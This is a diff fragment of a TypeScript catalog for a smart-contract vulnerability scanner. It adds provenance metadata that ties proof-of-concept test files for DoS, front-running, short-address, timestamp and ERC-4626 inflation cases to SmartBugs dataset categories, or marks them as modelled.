     "detectors": [
       "centralization"
     ],
-    "smartbugs": "other"
+    "smartbugs": "other",
+    "provenance": {
+      "kind": "modelled",
+      "category": "other",
+      "sources": [],
+      "note": "No SmartBugs Curated contract covers this class (the dataset has no ERC-20-fee / oracle / signature / ERC-4626 case). Modelled from the category's mechanics plus field practice; no dataset port exists."
+    }
   },
   {
     "file": "39-dos.t.sol",
@@ -558,7 +825,14 @@ export const POC_FALLBACK_CATALOG: Array<{ file: string; scenario: string; detec
     "detectors": [
       "unchecked-call"
     ],
-    "smartbugs": "denial_of_service"
+    "smartbugs": "denial_of_service",
+    "provenance": {
+      "kind": "dataset",
+      "category": "denial_of_service",
+      "sources": [
+        "denial_of_service/list_dos.sol"
+      ]
+    }
   },
   {
     "file": "40-erc4626-inflation.t.sol",
@@ -567,7 +841,13 @@ export const POC_FALLBACK_CATALOG: Array<{ file: string; scenario: string; detec
       "balance-as-price",
       "div-before-mul"
     ],
-    "smartbugs": "other"
+    "smartbugs": "other",
+    "provenance": {
+      "kind": "modelled",
+      "category": "other",
+      "sources": [],
+      "note": "No SmartBugs Curated contract covers this class (the dataset has no ERC-20-fee / oracle / signature / ERC-4626 case). Modelled from the category's mechanics plus field practice; no dataset port exists."
+    }
   },
   {
     "file": "41-create2-metamorphic.t.sol",
@@ -576,7 +856,13 @@ export const POC_FALLBACK_CATALOG: Array<{ file: string; scenario: string; detec
       "bytecode-create2",
       "selfdestruct"
     ],
-    "smartbugs": "other"
+    "smartbugs": "other",
+    "provenance": {
+      "kind": "modelled",
+      "category": "other",
+      "sources": [],
+      "note": "No SmartBugs Curated contract covers this class (the dataset has no ERC-20-fee / oracle / signature / ERC-4626 case). Modelled from the category's mechanics plus field practice; no dataset port exists."
+    }
   },
   {
     "file": "42-short-address-attack.t.sol",
@@ -584,7 +870,14 @@ export const POC_FALLBACK_CATALOG: Array<{ file: string; scenario: string; detec
     "detectors": [
       "short-address"
     ],
-    "smartbugs": "short_addresses"
+    "smartbugs": "short_addresses",
+    "provenance": {
+      "kind": "dataset",
+      "category": "short_addresses",
+      "sources": [
+        "short_addresses/short_address_example.sol"
+      ]
+    }
   },
   {
     "file": "43-front-running.t.sol",
@@ -592,7 +885,14 @@ export const POC_FALLBACK_CATALOG: Array<{ file: string; scenario: string; detec
     "detectors": [
       "front-running"
     ],
-    "smartbugs": "front_running"
+    "smartbugs": "front_running",
+    "provenance": {
+      "kind": "dataset",
+      "category": "front_running",
+      "sources": [
+        "front_running/eth_tx_order_dependence_minimal.sol"
+      ]
+    }
   },
   {
     "file": "44-external-contract-ref.t.sol",
@@ -600,7 +900,13 @@ export const POC_FALLBACK_CATALOG: Array<{ file: string; scenario: string; detec
     "detectors": [
       "external-contract-referencing"
     ],
-    "smartbugs": "other"
+    "smartbugs": "other",
+    "provenance": {
+      "kind": "modelled",
+      "category": "other",
+      "sources": [],
+      "note": "No SmartBugs Curated contract covers this class (the dataset has no ERC-20-fee / oracle / signature / ERC-4626 case). Modelled from the category's mechanics plus field practice; no dataset port exists."
+    }
   },
   {
     "file": "45-timestamp-dependence.t.sol",
@@ -609,7 +915,14 @@ export const POC_FALLBACK_CATALOG: Array<{ file: string; scenario: string; detec
       "timestamp",
       "bytecode-timestamp"
     ],
-    "smartbugs": "time_manipulation"
+    "smartbugs": "time_manipulation",
+    "provenance": {
+      "kind": "dataset",
+      "category": "time_manipulation",
+      "sources": [
+        "time_manipulation/timed_crowdsale.sol"
+      ]
+    }
   }
 ];
 
